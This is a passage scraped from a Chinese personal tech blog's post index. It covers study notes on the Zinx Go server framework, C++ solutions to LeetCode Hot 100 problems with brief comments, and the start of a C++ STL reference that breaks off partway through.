所以Router全部继承BaseRouter的好处是，不需要实现PreHandle和PostHandle也可以实例化 func (br *BaseRouter)PreHandle(req ziface.IRequest){} func (br *BaseRouter)Handle(req ziface.IRequest){} func (br *BaseRouter)PostHandle(req ziface.IRequest){}  //3.3 处理该新连接请求的 业务 方法， 此时应该有 handler 和 conn是绑定的 dealConn := NewConntion(conn, cid, s.Router) cid ++  //3.4 启动当前链接的处理业务 go dealConn.Start()   总来来说就是一个路由和连接绑定，一旦有客户端连接，就新建一个连接、路由和这个客户端绑定，并启动这个连接来干业务\nZinx-V0.4增添全局配置代码实现 定义一个全局json文件，定义一个结构体来接受json。简单\nZinx-V0.5消息封装 我们把服务器的全部数据都放在一个Request里，很明显，现在是用一个[]byte来接受全部数据，又没有长度，又没有消息类型，这不科学。怎么办呢？我们现在就要自定义一种消息类型，把全部的消息都放在这种消息类型里。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14  type IMessage interface { \tGetDataLen() uint32\t//获取消息数据段长度 \tGetMsgId() uint32\t//获取消息ID \tGetData() []byte\t//获取消息内容  \tSetMsgId(uint32)\t//设计消息ID \tSetData([]byte)\t//设计消息内容 \tSetDataLen(uint32)\t//设置消息数据段长度 } type Message struct { \tId uint32 //消息的ID \tDataLen uint32 //消息的长度 \tData []byte //消息的内容 }   我们这里就是采用经典的TLV(Type-Len-Value)封包格式来解决TCP粘包问题吧。\n1 2  //类型断言 接口转为 msg := msgHead.(*znet.Message)   https://vimsky.com/examples/usage/golang_encoding_binary_Write.html\nhttps://vimsky.com/examples/usage/golang_encoding_binary_Read.html\nZinx的多路由模式 之前的Zinx好像只能绑定一个路由的处理业务方法。显然这是无法满足基本的服务器需求的，那么现在我们要在之前的基础上，给Zinx添加多路由的方式。\n既然是多路由的模式，我们这里就需要给MsgId和对应的处理逻辑进行捆绑。所以我们需要一个Map。\n1 2 3 4 5 6 7  Apis map[uint32] ziface.IRouter  //路由功能：给当前服务注册一个路由业务方法，供客户端链接处理使用 AddRouter(router IRouter) ----\u0026gt; AddRouter(msgId uint32, router IRouter)  //int 转string strconv.Itoa(int(msgId)))   增加了MsgHandle\n就是发送什么消息类型，就用什么路由处理\n为了实现这个功能，首先加了一个IMessage接口来实现消息\nIDataPack来实现封包和拆包\nIMsgHandle来使消息和路由绑定\nZinx的读写分离模型 好了，接下来我们就要对Zinx做一个小小的改变，就是与客户端进修数据交互的Gouroutine由一个变成两个，一个专门负责从客户端读取数据，一个专门负责向客户端写数据。这么设计有什么好处，当然是目的就是高内聚，模块的功能单一，对于我们今后扩展功能更加方便。\n读和写分别用一个go协程\nZinx的消息队列及多任务机制 我们可以通过worker的数量来限定处理业务的固定goroutine数量，而不是无限制的开辟Goroutine，虽然我们知道go的调度算法已经做的很极致了，但是大数量的Goroutine依然会带来一些不必要的环境切换成本，这些本应该是服务器应该节省掉的成本。我们可以用消息队列来缓冲worker工作的数据。\n之前是没来一个conn 就go c.MsgHandler.DoMsgHandler(\u0026amp;req)\n现在是c.MsgHandler.SendMsgToTaskQueue(\u0026amp;req)将请求交给消息队列处理。\nZinx的链接管理 现在我们要为Zinx框架增加链接个数的限定，如果超过一定量的客户端个数，Zinx为了保证后端的及时响应，而拒绝链接请求。\n我们之前给Connection提供了一个发消息的方法SendMsg()，这个是将数据发送到一个无缓冲的channel中msgChan。但是如果客户端链接比较多的话，如果对方处理不及时，可能会出现短暂的阻塞现象，我们可以做一个提供一定缓冲的发消息方法，做一些非阻塞的发送体验。\nMMO游戏 大型多人在线游戏\n","permalink":"https://kevinerr.github.io/posts/tech/zinx-learn/","summary":"代码 本人代码仓库 官方代码仓库 官方教程 官方文档 引言 Golang目前在服务器的应用框架很多，但是应用在游戏领域或者其他长链接的领域的轻量级企业框","title":"Zinx Learn"},{"content":"简单模块 1、两数之和 简单题，用unordered_map\u0026lt;int,int\u0026gt; um;key为值，value为数组下标\n遍历一遍，看um中是否有和为target的另一半，并且另一半的数组下标不能相同\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19  class Solution { public:  vector\u0026lt;int\u0026gt; twoSum(vector\u0026lt;int\u0026gt;\u0026amp; nums, int target) {  vector\u0026lt;int\u0026gt; res;  unordered_map\u0026lt;int,int\u0026gt; um;  for(int i =0;i\u0026lt;nums.size();i++){  um[nums[i]]=i;  }  for(int i=0;i\u0026lt;nums.size();i++){  int k =target-nums[i];  if(um.count(k) \u0026amp;\u0026amp; um[k]!=i){ //WA一次，没考虑um[k]!=i  res.push_back(i);  res.push_back(um[k]);  break;  }  }  return res;  } };   20、有效的括号 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24  class Solution { public:  bool isValid(string s) {  stack\u0026lt;char\u0026gt; st;  for(int i =0;i\u0026lt;s.length();i++){  if(s[i]==\u0026#39;(\u0026#39;){  st.push(\u0026#39;)\u0026#39;);  }else if(s[i]==\u0026#39;[\u0026#39;){  st.push(\u0026#39;]\u0026#39;);  }else if(s[i]==\u0026#39;{\u0026#39;){  st.push(\u0026#39;}\u0026#39;);  }else{  if(st.size()\u0026amp;\u0026amp;s[i]==st.top()){ //WA一次，没考虑st.size()  st.pop();  continue;  }else{  return false;  }  }  }  if(st.size()) return false;  else return true;  } };   21、合并2个有序链表 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33  //思路一：迭代 class Solution { public:  ListNode* mergeTwoLists(ListNode* list1, ListNode* list2) {  ListNode * dummy = new ListNode(0); //创建哑结点  ListNode * p = dummy; //新链表的工作指针  //如果两个都不为空  while(list1!=NULL\u0026amp;\u0026amp;list2!=NULL){  //先把list1中小的元素放到新链表中  if(list1-\u0026gt;val\u0026lt;=list2-\u0026gt;val){  p-\u0026gt;next = list1;  list1=list1-\u0026gt;next;  p=p-\u0026gt;next;  }  else{  p-\u0026gt;next = list2;  list2=list2-\u0026gt;next;  p=p-\u0026gt;next;  }  }  //如果list1空了，list2不空  if(list2!=NULL){  //把list2剩下部分放进去  p-\u0026gt;next =list2;  }  //如果list2空了，list1不空  if(list1!=NULL){  //把list1剩下部分放进去  p-\u0026gt;next = list1;  }  return dummy-\u0026gt;next;  } };   53、最大子数组和 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16  class Solution { public:  int maxSubArray(vector\u0026lt;int\u0026gt;\u0026amp; nums) {  int len = nums.size();  int dp[len];  int res = -10005;  dp[0]=nums[0];  for(int i =1;i\u0026lt;len;i++){  dp[i]=max(dp[i-1]+nums[i],nums[i]);  }  for(int i =0;i\u0026lt;len;i++){  res=max(res,dp[i]);  }  return res;  } };   70、爬楼梯 递归超时了\n1 2 3 4 5 6 7 8 9 10 11  class Solution { public:  int get(int n){  if(n==1) return 1;  else if(n==2) return 2;  else return get(n-1)+get(n-2);  }  int climbStairs(int n) {  return get(n);  } };   改用dp\n1 2 3 4 5 6 7 8 9 10 11 12  class Solution { public:  int dp[48];  int climbStairs(int n) {  dp[1]=1;  dp[2]=2;  for(int i =3;i\u0026lt;=n;i++){  dp[i]=dp[i-1]+dp[i-2];  }  return dp[n];  } };   94、二叉树的中序遍历 1 2 3 4 5 6 7 8 9 10 11 12 13 14  class Solution { public:  vector\u0026lt;int\u0026gt; res;  void dfs(TreeNode* root){  if(root-\u0026gt;left) dfs(root-\u0026gt;left);  res.push_back(root-\u0026gt;val);  if(root-\u0026gt;right) dfs(root-\u0026gt;right);  }  vector\u0026lt;int\u0026gt; inorderTraversal(TreeNode* root) {  if(root==nullptr) return res;  dfs(root);  return res;  } };   101、对称二叉树 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17  class Solution { public:  bool isSame(TreeNode* l,TreeNode* r){  if(!l\u0026amp;\u0026amp;!r) return true;  if(!l\u0026amp;\u0026amp;r||l\u0026amp;\u0026amp;!r) return false;  if(l-\u0026gt;val==r-\u0026gt;val){  return isSame(l-\u0026gt;left,r-\u0026gt;right)\u0026amp;\u0026amp;isSame(l-\u0026gt;right,r-\u0026gt;left);  }  return false;   }  bool isSymmetric(TreeNode* root) {  if(!root-\u0026gt;left\u0026amp;\u0026amp;!root-\u0026gt;right) return true;  if(root-\u0026gt;left\u0026amp;\u0026amp;root-\u0026gt;right) return isSame(root-\u0026gt;left,root-\u0026gt;right);  return false;  } };   104、二叉树的最大深度 dfs\n1 2 3 4 5 6 7 8 9 10 11 12  class Solution { public:  int dfs(TreeNode* root){  if(!root) return 0;  int l = 1+dfs(root-\u0026gt;left);  int r = 1+dfs(root-\u0026gt;right);  return max(l,r);  }  int maxDepth(TreeNode* root) {  return dfs(root);  } };   bfs\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20  class Solution { public:  int maxDepth(TreeNode* root) {  int res = 0;  if(!root) return res;  queue\u0026lt;TreeNode*\u0026gt; q;  q.push(root);  while(q.size()){  int len = q.size();  res++;  for(int i =0;i\u0026lt;len;i++){  auto t = q.front();  q.pop();  if(t-\u0026gt;left) q.push(t-\u0026gt;left);  if(t-\u0026gt;right) q.push(t-\u0026gt;right);  }  }  return res;  } };   121、买卖股票的最佳时机 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16  class Solution { public:  int maxProfit(vector\u0026lt;int\u0026gt;\u0026amp; prices) {  int n = prices.size();  int res =0;  int dp[n]; //dp[i]表示前i个元素中的最小元素  dp[0]=prices[0];  for(int i =1;i\u0026lt;n;i++){  dp[i]=min(prices[i],dp[i-1]);  }  for(int i =0;i\u0026lt;n;i++){  res=max(res,prices[i]-dp[i]);  }  return res;  } };   1 2 3 4 5 6 7 8 9 10 11 12 13  //空间优化版本 class Solution {  public int maxProfit(int[] prices) {  if(prices.length \u0026lt;= 1)  return 0;  int min = prices[0], max = 0;  for(int i = 1; i \u0026lt; prices.length; i++) {  max = Math.max(max, prices[i] - min);  min = Math.min(min, prices[i]);  }  return max;  } }   136、只出现一次的数 1 2 3 4 5 6 7 8 9 10  class Solution { public:  int singleNumber(vector\u0026lt;int\u0026gt;\u0026amp; nums) {  int res=0;  for(int i =0;i\u0026lt;nums.size();i++){  res^=nums[i]; //2个相同的数异或为0，0异或任意一个数等于这个数  }  return res;  } };   141、环形链表 1 2 3 4 5 6 7 8 9 10 11 12  class Solution { public:  bool hasCycle(ListNode *head) {  ListNode *one =head;  ListNode *two = head;  while(two!=NULL\u0026amp;\u0026amp;two-\u0026gt;next!=NULL){  one=one-\u0026gt;next;two=two-\u0026gt;next-\u0026gt;next;  if(one==two) return true;  }  return false;  } };   key:一快一慢 总会想见\n155、最小栈 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28  class MinStack { public:  /** initialize your data structure here. */  MinStack() {  }   void push(int x) {  if (st.size() == 0) {  st.push({x, x});  } else {  st.push({x, min(x, st.top().second)});  }  }   void pop() {  st.pop();  }   int top() {  return st.top().first;  }   int getMin() {  return st.top().second;  } private:  stack\u0026lt;pair\u0026lt;int, int\u0026gt;\u0026gt; st; };   key:妙用pair\n160、相交链表 1 2 3 4 5 6 7 8 9 10 11 12 13  class Solution { public:  ListNode *getIntersectionNode(ListNode *headA, ListNode *headB) {  if(headA == NULL || headB == NULL) return NULL;  ListNode* curA = headA;  ListNode* curB = headB;  while(curA != curB) {  curA = curA == NULL ? headB : curA-\u0026gt;next;  curB = curB == NULL ? headA : curB-\u0026gt;next;  }  return curA;  } };   key:我走过你来时的路\n169、多数元素 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16  class Solution { public:  int majorityElement(vector\u0026lt;int\u0026gt;\u0026amp; nums) {  int m = nums[0];  int count =1;  for(int i =1;i\u0026lt;nums.size();i++){  if(nums[i]==m) count++;  else count--;  if(count==0){  m=nums[i];  count =1;  }  }  return m;  } };   key:摩尔投票法\n有一个对摩尔投票法非常形象的比喻：多方混战。\n首先要知道，在任何数组中，出现次数大于该数组长度1/3的值最多只有两个。\n我们把这道题比作一场多方混战，战斗结果一定只有最多两个阵营幸存，其他阵营被歼灭。数组中的数字即代表某士兵所在的阵营。\n我们维护两个潜在幸存阵营A和B。我们遍历数组，如果遇到了属于A或者属于B的士兵，则把士兵加入A或B队伍中，该队伍人数加一。继续遍历。\n如果遇到了一个士兵既不属于A阵营，也不属于B阵营，这时有两种情况：\n情况一：A阵营和B阵营都还有活着的士兵，那么进行一次厮杀，参与厮杀的三个士兵全部阵亡：A阵营的一个士兵阵亡，B阵营的一个士兵阵亡，这个不知道从哪个阵营来的士兵也阵亡。继续遍历。\n情况二：A阵营或B阵营已经没有士兵了。没有士兵的阵营暂时从地球上消失了。那么把当前遍历到的新士兵算作新的潜在幸存阵营，这个新阵营只有他一个人。继续遍历。\n大战结束，最后A和B阵营就是初始人数最多的阵营。判断一下A，B的人数是否超过所有人数的三分之一就行了。\n229、求众数2 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46  class Solution { public:  vector\u0026lt;int\u0026gt; majorityElement(vector\u0026lt;int\u0026gt;\u0026amp; nums) {  vector\u0026lt;int\u0026gt; ans;  int element1 = 0;  int element2 = 0;  int vote1 = 0;  int vote2 = 0;  for(auto num:nums){  if(vote1\u0026gt;0\u0026amp;\u0026amp;num==element1){  vote1++;  }else if(vote2\u0026gt;0\u0026amp;\u0026amp;num==element2){  vote2++;  }else if(vote1==0){  vote1++;  element1=num;  }else if(vote2==0){  vote2++;  element2=num;  }else{  vote1--;  vote2--;  }  }  int cnt1 = 0;  int cnt2 = 0;  for (auto \u0026amp; num : nums) {  if (vote1 \u0026gt; 0 \u0026amp;\u0026amp; num == element1) {  cnt1++;  }  if (vote2 \u0026gt; 0 \u0026amp;\u0026amp; num == element2) {  cnt2++;  }  }  // 检测元素出现的次数是否满足要求  if (vote1 \u0026gt; 0 \u0026amp;\u0026amp; cnt1 \u0026gt; nums.size() / 3) {  ans.push_back(element1);  }  if (vote2 \u0026gt; 0 \u0026amp;\u0026amp; cnt2 \u0026gt; nums.size() / 3) {  ans.push_back(element2);  }   return ans;   } };   206、反转链表 1 2 3 4 5 6 7 8 9 10 11 12 13  class Solution { public:  ListNode* reverseList(ListNode* head) {  ListNode* cur = NULL, *pre = head;  while (pre != NULL) {  ListNode* t = pre-\u0026gt;next;  pre-\u0026gt;next = cur;  cur = pre;  pre = t;  }  return cur;  } };   226、翻转二叉树 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16  class Solution { public:  TreeNode* invertTree(TreeNode* root) {  if(!root) return nullptr;  TreeNode* t =root-\u0026gt;left;  root-\u0026gt;left=root-\u0026gt;right;  root-\u0026gt;right=t;  if(root-\u0026gt;left){  invertTree(root-\u0026gt;left);  }  if(root-\u0026gt;right){  invertTree(root-\u0026gt;right);  }  return root;  } };   234、回文链表 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17  class Solution { public:  bool isPalindrome(ListNode* head) {  stack\u0026lt;int\u0026gt; st;  ListNode* p = head;  while(p){  st.push(p-\u0026gt;val);  p=p-\u0026gt;next;  }  while(head){  if(head-\u0026gt;val!=st.top()) return false;  head=head-\u0026gt;next;  st.pop();  }  return true;  } };   283、移动零 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16  class Solution { public:  void moveZeroes(vector\u0026lt;int\u0026gt;\u0026amp; nums) {  int len = nums.size();  int j=0;  for(int i=0;i\u0026lt;len;i++){  if(nums[i]!=0){  nums[j]=nums[i];  j++;  }  }  for(;j\u0026lt;len;j++){  nums[j]=0;  }  } };   338、比特位计数 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16  class Solution { public:  vector\u0026lt;int\u0026gt; countBits(int n) {  vector\u0026lt;int\u0026gt; res(n+1);  for(int i =0;i\u0026lt;=n;i++){  int cnt = 0;  int j =i;  while(j){  if(j\u0026amp;1) cnt++;  j=j\u0026gt;\u0026gt;1;  }  res[i]=cnt;  }  return res;  } };   1 2 3 4 5 6 7 8 9 10 11  public class Solution {  public int[] CountBits(int n) {  //x = x\u0026amp;(x-1),清除最低位的1  int[] bits = new int[n+1];  for(int i=1;i\u0026lt;=n;i++)  {  bits[i] = bits[i\u0026amp;(i-1)]+1;  }  return bits;  } }   key:x = x \u0026amp; (x-1)\n448、找到所有数组中消失的元素 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16  class Solution { public:  vector\u0026lt;int\u0026gt; findDisappearedNumbers(vector\u0026lt;int\u0026gt;\u0026amp; nums) {  vector\u0026lt;int\u0026gt; res;  set\u0026lt;int\u0026gt; st;  for(int i =0;i\u0026lt;nums.size();i++){  st.insert(nums[i]);  }  for(int i =1;i\u0026lt;=nums.size();i++){  if(!st.count(i)){  res.push_back(i);  }  }  return res;  } };   461、汉明距离 1 2 3 4 5 6 7 8 9 10 11 12  class Solution { public:  int hammingDistance(int x, int y) {  int res=0;  while(x||y){  res+= (x\u0026amp;1)^(y\u0026amp;1);  x=x\u0026gt;\u0026gt;1;  y=y\u0026gt;\u0026gt;1;  }  return res;  } };   543、二叉树的直径 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15  class Solution { public:  int res = 0;  int dfs(TreeNode* root){  if(!root) return 0;  int l = 1+dfs(root-\u0026gt;left);  int r = 1+dfs(root-\u0026gt;right);  res = max(res,l+r-2);  return max(l,r);  }  int diameterOfBinaryTree(TreeNode* root) {  dfs(root);  return res;  } };   617、合并二叉树 1 2 3 4 5 6 7 8 9 10 11  class Solution { public:  TreeNode* mergeTrees(TreeNode* root1, TreeNode* root2) {  if(root1==nullptr){return root2;}  if(root2==nullptr){return root1;}  root2-\u0026gt;val=root2-\u0026gt;val+root1-\u0026gt;val;  root2-\u0026gt;left=mergeTrees(root1-\u0026gt;left,root2-\u0026gt;left);  root2-\u0026gt;right=mergeTrees(root1-\u0026gt;right,root2-\u0026gt;right);  return root2;  } };   中等模块 2、两数相加 3、无重复字符串的最长子串 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23  class Solution { public:  int lengthOfLongestSubstring(string s) {  int n = s.length();  if(n==0) return 0;  int left=0;  int len = 0;  int res = 0;  unordered_map\u0026lt;char,int\u0026gt; st;  for(int i =0;i\u0026lt;n;i++){  if(!st.count(s[i])){  len++;  st[s[i]]=i;  }else{  left=st[s[i]]\u0026gt;=left?st[s[i]]+1:left; //注意  len = i-left+1;  st[s[i]]=i;  }  res=max(res,len);  }  return res;  } };   5、最长回文子串 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32  class Solution { public:  string longestPalindrome(string s) {  int n = s.length();  int maxLen = 0;  int maxLeft = 0;  int len = 1;  for(int i =0;i\u0026lt;n;i++){  int l = i-1;  int r = i+1;  while(l\u0026gt;=0\u0026amp;\u0026amp;s[l]==s[i]){  len++;  l--;  }  while(r\u0026lt;n\u0026amp;\u0026amp;s[r]==s[i]){  len++;  r++;  }  while(l\u0026gt;=0\u0026amp;\u0026amp;r\u0026lt;n\u0026amp;\u0026amp;s[l]==s[r]){  len=len+2;  l--;  r++;  }  if(len\u0026gt;maxLen){  maxLen=len;  maxLeft=l;  }  len = 1;  }  return s.substr(maxLeft+1,maxLen);  } };   11、盛最多水的容器 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21  class Solution { public:  int maxArea(vector\u0026lt;int\u0026gt;\u0026amp; height) {  int r = height.size()-1;  int res = 0;  int l = 0;  int sum =0;  while(l\u0026lt;r){  int shorter = min(height[l],height[r]);  int len = r-l;  if(height[l]\u0026lt;height[r]){  l++;  }else{  r--;  }  sum=shorter*len;  res=max(res,sum);  }  return res;  } };   15、三数之和 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35  class Solution { public:  vector\u0026lt;vector\u0026lt;int\u0026gt;\u0026gt; threeSum(vector\u0026lt;int\u0026gt;\u0026amp; nums) {  vector\u0026lt;vector\u0026lt;int\u0026gt;\u0026gt; ans;  if(nums.size()\u0026lt;3) return ans;  sort(nums.begin(), nums.end());  if(nums[0]\u0026gt;0) return ans;  int i = 0;  while(i\u0026lt;nums.size()){  if(nums[i]\u0026gt;0) break; // 1楼网友指正，将这个if语句放这里提前终止循环  int left = i+1, right = nums.size()-1;  while(left\u0026lt; right){  if(nums[i] + nums[left] +nums[right]\u0026gt;0)  right--;  else if(nums[i] + nums[left] +nums[right]\u0026lt;0)  left++;  else{  ans.push_back({nums[i], nums[left], nums[right]});  // 相同的left和right不应该再次出现，因此跳过  while(left\u0026lt;right\u0026amp;\u0026amp;nums[left]==nums[left+1])  left++;  while(left\u0026lt;right\u0026amp;\u0026amp;nums[right] == nums[right-1])  right--;  left++;  right--;  }  }  // 避免nums[i]作为第一个数重复出现  while(i+1\u0026lt;nums.size()\u0026amp;\u0026amp;nums[i] == nums[i+1])  i++;  i++;  }  return ans;  } };   16、最接近的三数之和 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32  class Solution { public:  int threeSumClosest(vector\u0026lt;int\u0026gt;\u0026amp; nums, int target) {  int res = 1e7;  int n = nums.size();  sort(nums.begin(),nums.end());  int i =0;  while(i\u0026lt;n){  int l = i+1;  int r = n-1;  while(l\u0026lt;r){  int sum=nums[i]+nums[l]+nums[r];  if(sum\u0026lt;target){  l++;  if(abs(res-target)\u0026gt;abs(sum-target)){  res=sum;  }  }else if(sum\u0026gt;target){  r--;  if(abs(res-target)\u0026gt;abs(sum-target)){  res=sum;  }  }  else{  return target;  }  }  i++;  }  return res;  } };   17、电话号码的字母组合 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31  class Solution { public:  //1. 用map记录每个数字按键对应的所有字母  unordered_map\u0026lt;char, string\u0026gt; m = {  {\u0026#39;2\u0026#39;, \u0026#34;abc\u0026#34;}, {\u0026#39;3\u0026#39;, \u0026#34;def\u0026#34;}, {\u0026#39;4\u0026#39;, \u0026#34;ghi\u0026#34;}, {\u0026#39;5\u0026#39;, \u0026#34;jkl\u0026#34;}, {\u0026#39;6\u0026#39;, \u0026#34;mno\u0026#34;},  {\u0026#39;7\u0026#39;, \u0026#34;pqrs\u0026#34;}, {\u0026#39;8\u0026#39;, \u0026#34;tuv\u0026#34;}, {\u0026#39;9\u0026#39;, \u0026#34;wxyz\u0026#34;}  };  //2. 存储最终结果和临时结果的变量  vector\u0026lt;string\u0026gt; ans;  string current;  string cp;  int n;  void dfs(int len,char c){  if(current.length()==n){  ans.push_back(current);  return;  }  for(int i =0;i\u0026lt;m[c].length();i++){  current+=m[c][i];  dfs(len+1,cp[len+1]);  current.pop_back();  }  }  vector\u0026lt;string\u0026gt; letterCombinations(string digits) {  cp = digits;  n = digits.length();  if(n==0) return ans;  dfs(0,digits[0]);  return ans;  } };   19、删除链表的倒数第N个结点 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17  class Solution { public:  ListNode* removeNthFromEnd(ListNode* head, int n) {  ListNode* start = head;  ListNode* end = head;  while(n--){  end = end -\u0026gt; next;  }  if(end == nullptr) return head-\u0026gt;next;  while(end -\u0026gt; next != nullptr){  end = end -\u0026gt; next;  start = start -\u0026gt; next;  }  start -\u0026gt; next = start -\u0026gt; next -\u0026gt; next;  return head;  } };   22、括号生成 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54  class Solution { public:  vector\u0026lt;string\u0026gt; res;  string cur=\u0026#34;\u0026#34;;  void dfs(int l,int r){  if(l==0\u0026amp;\u0026amp;r==0){  res.push_back(cur);  return;  }  if(l\u0026gt;0){  cur+=\u0026#39;(\u0026#39;;  dfs(l-1,r);  cur.pop_back();  }  if(r\u0026gt;l){  cur+=\u0026#39;)\u0026#39;;  dfs(l,r-1);  cur.pop_back();  }  }  vector\u0026lt;string\u0026gt; generateParenthesis(int n) {  dfs(n,n);  return res;  } };   class Solution { public:  int m;  vector\u0026lt;string\u0026gt; res;  string cur=\u0026#34;\u0026#34;;  void dfs(int l,int r){  if(l==r\u0026amp;\u0026amp;l+r==2*m){  res.push_back(cur);  return;  }  if(l\u0026lt;=m){  cur+=\u0026#39;(\u0026#39;;  dfs(l+1,r);  cur.pop_back();  }  if(l\u0026gt;r){  cur+=\u0026#39;)\u0026#39;;  dfs(l,r+1);  cur.pop_back();  }  }  vector\u0026lt;string\u0026gt; generateParenthesis(int n) {  m = n;  dfs(0,0);  return res;  } };   31、下一个排列 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33  class Solution { public:  void nextPermutation(vector\u0026lt;int\u0026gt;\u0026amp; nums) {  next_permutation(nums.begin(),nums.end());  } };  class Solution { public:  void nextPermutation(vector\u0026lt;int\u0026gt;\u0026amp; nums) {  int n = nums.size();  int i,j;  bool flag=false;  for(int k=n-1;k\u0026gt;=1;k--){  if(nums[k]\u0026gt;nums[k-1]){  i = k-1;  j = k;  flag=true;  break;  }  }  if(flag){  for(int k = n-1;k\u0026gt;=i;k--){  if(nums[k]\u0026gt;nums[i]){  swap(nums[k],nums[i]);  sort(nums.begin()+j,nums.end());  break;  }  }  }  else sort(nums.begin(),nums.end());  } };   33. 搜索旋转排序数组 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30  class Solution { public:  int search(vector\u0026lt;int\u0026gt;\u0026amp; nums, int target) {  int l = 0,r=nums.size()-1;  if(target==nums[l]) return l;  if(target==nums[r]) return r;  if(target\u0026lt;nums[l]\u0026amp;\u0026amp;target\u0026gt;nums[r]) return -1;  if(target\u0026gt;nums[l]){  while(l\u0026lt;r){  int mid = (l+r) \u0026gt;\u0026gt; 1;  if(target==nums[mid]) return mid;  else if(target\u0026lt;nums[mid]||nums[mid]\u0026lt;nums[0]) r=mid;  else l=mid+1;  }  return -1;  }  l = 0;  r=nums.size()-1;  if(target\u0026lt;nums[r]){  while(l\u0026lt;r){  int mid = (l+r) \u0026gt;\u0026gt; 1;  if(target==nums[mid]) return mid;  else if(nums[mid]\u0026gt;nums[nums.size()-1]||nums[mid]\u0026lt;target) l=mid+1;  else r=mid;  }  return -1;  }  return -1;  } };   ","permalink":"https://kevinerr.github.io/posts/algorithm/leetcode_hot100/","summary":"简单模块 1、两数之和 简单题，用unordered_map\u0026lt;int,int\u0026gt; um;key为值，value为数组下标 遍历一遍，看um","title":"Leetcode_hot100"},{"content":"vector 初始化 1 2 3 4  vector\u0026lt;int\u0026gt; a(10); //没有给出初值，其值是不确定的 vector\u0026lt;int\u0026gt; a(10,1); //定义了10个整型元素的向量,且给出每个元素的初值为1 vector\u0026lt;int\u0026gt; a(b); //用b向量来创建a向量，整体复制性赋值 int b[7]={1,2,3,4,5,9,8}; vector\u0026lt;int\u0026gt; a(b,b+7); //从数组中获得初值   常用操作 1 2 3 4 5 6  a.back(); //返回a的最后一个元素 a.front(); //返回a的第一个元素 a.pop_back(); //删除a向量的最后一个元素 a.push_back(5); //在a的最后一个向量后插入一个元素，其值为5 a.size(); //返回a中元素的个数； a.clear(); //清空a中的元素   重要算法 1 2 3  sort(a.begin(),a.end()); //对a中的从a.begin()（包括它）到a.end()（不包括它）的元素进行从小到大排列 reverse(a.begin(),a.end()); //对a中的从a.begin()（包括它）到a.end()（不包括它）的元素倒置， find(a.begin(),a.end(),10); //在a中的从a.begin()（包括它）到a.end()（不包括它）的元素中查找10，若存在返回其在向量中的位置   误区 1 2 3 4  vector\u0026lt;int\u0026gt; a; for(int i=0;i\u0026lt;10;i++)  a[i]=i; //这种做法以及类似的做法都是错误的。下标只能用于获取已存在的元素，而现在的a[i]还是空的对象   pair 定义 1 2 3  pair\u0026lt;T1, T2\u0026gt; p1; //创建一个空的pair对象（使用默认构造），它的两个元素分别是T1和T2类型，采用值初始化。 p1.first; // 返回对象p1中名为first的公有数据成员 p1.second; // 返回对象p1中名为second的公有数据成员   string string和int互转 1 2 3  string pi = \u0026#34;pi is \u0026#34; + to_string(3.1415926); string s = \u0026#34;12\u0026#34;; int a = atoi(s.c_str());   初始化 1 2  string s1; //默认值是\u0026#34;\u0026#34; string s4 (5, \u0026#39;s\u0026#39;); //\u0026#34;sssss\u0026#34;   string 字符串的增删改查 1 2 3 4  s1 = s2 = \u0026#34;1234567890\u0026#34;; s3 = \u0026#34;aaa\u0026#34;; s1.insert(5, s3); //12345aaa67890 //pos 表示要插入的位置，也就是下标；str 表示要插入的字符串，它可以是 string 字符串   1 2 3 4  string s1, s2, s3; s1 = s2 = s3 = \u0026#34;1234567890\u0026#34;; s2.erase(5); //12345 s3.erase(5, 3); //1234590 3表示len   1 2 3  string s1 = \u0026#34;first second third\u0026#34;; string s2; s2 = s1.substr(6, 6); //second 6表示len   1 2 3 4 5 6 7 8  string s1 = \u0026#34;first second second third\u0026#34;; string s2 = \u0026#34;c\u0026#34;; s1.find(s2); //8 s1.find(s2,10); //15 从第十个位置开始找 s1.rfind(s2); //15 //从右边开始找 s1.find(s2,10); //8  返回的值都是数组下标   stack 常用操作\n1 2 3 4 5 6 7  stack\u0026lt;int\u0026gt; q;\t//以int型为例 int x; q.push(x);\t//将x压入栈顶 q.top();\t//返回栈顶的元素 q.pop();\t//删除栈顶的元素 q.size();\t//返回栈中元素的个数 q.empty();\t//检查栈是否为空,若为空返回true,否则返回false   queue 常用操作\n1 